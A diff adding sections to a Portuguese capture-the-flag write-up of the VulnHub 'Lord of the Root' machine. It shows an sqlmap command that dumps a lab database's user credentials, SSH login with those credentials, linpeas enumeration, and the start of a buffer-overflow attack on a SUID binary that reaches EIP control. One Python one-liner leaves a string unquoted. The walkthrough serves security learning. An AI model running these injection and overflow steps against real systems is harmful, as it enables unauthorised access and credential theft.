@@ -171,6 +171,121 @@ Parameter: username (POST)
 
 Agora esperamos o SQLMap fazer o time-based e me retornar os valores que preciso para dar prosseguimento na exploração da máquina
 
+Vamos adaptando o SQLMap pra nos trazer o resultado que queremos
+
+```bash
+sqlmap -u http://192.168.56.139:1337/978345210/index.php --method POST --data "username=user&password=pass&submit=+Login+" --not-string="Username or Password is invalid" -D Webapp -T Users --dump
+```
+
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login7.png)
 
+Nos traz algumas credenciais e senhas
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login8.png)
+
+```
+ +----+----------+------------------+
+| id | username | password         |
++----+----------+------------------+
+| 1  | frodo    | iwilltakethering |
+| 2  | smeagol  | MyPreciousR00t   |
+| 3  | aragorn  | AndMySword       |
+| 4  | legolas  | AndMyBow         |
+| 5  | gimli    | AndMyAxe         |
++----+----------+------------------+
+```
+
+Acessamos o webpage com essas credenciais e não encontramos nada de útil para a exploração.
+
+# smeagol -> root
+
+Acessamos via SSH a máquina com as credenciais do `smeagol`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ssh.png)
+
+Agora iniciamos a enumeração para escalarmos privilégio nessa máquina
+
+Rodamos o linpeas para encontrar pontos de escalação
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin.png)
+
+Baixamos na nossa máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin1.png)
+
+Rodamos na máquina virtual
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin2.png)
+
+O que encontramos?
+
+`Kernel` desatualizado
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin3.png)
+
+Arquivos com `SUID` habilitado
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin4.png)
+
+Vamos mostrar a escalação desses dois modos
+
+## Buffer Overflow
+
+Bom, pela cara dos arquivos devemos fazer um Buffer Overflow neles pra podermos virar root nessa máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf.png)
+
+Verificamos o que ele faz
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf1.png)
+
+Pelas strings dele verificamos que ele tem a função `strcpy`, e essa função é vulnerável a Buffer Overflow
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf2.png)
+
+Criamos um pattern nele pra ver em quanto ele da o crash
+
+```bash
+./file $(python -c 'print "A" * 200')
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf3.png)
+
+Criamos um agora personalizado
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf4.png)
+
+O binário fica mudando de porta a cada pouco, isso tem que ser verificado... quando joguei o pattern no errado ele não aparece com Segmentation Fault, antes tava na porta 1 agora ta na porta 2
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf5.png)
+
+Encontramos o ponto de crash dele
+
+```
+0x41376641 in ?? ()
+```
+
+Agora descobrimos o ponto exato, que é 171
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf6.png)
+
+Agora comprovamos esse crash com o pattern de 171
+
+```bash
+./file $(python -c 'print "A" * 171 + BBBB')
+```
+
+Agora está na porta 2, mas ai está, o **0x42424242** que é **BBBB**
+
+Ou seja... Controlamos o EIP!!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf7.png)
 
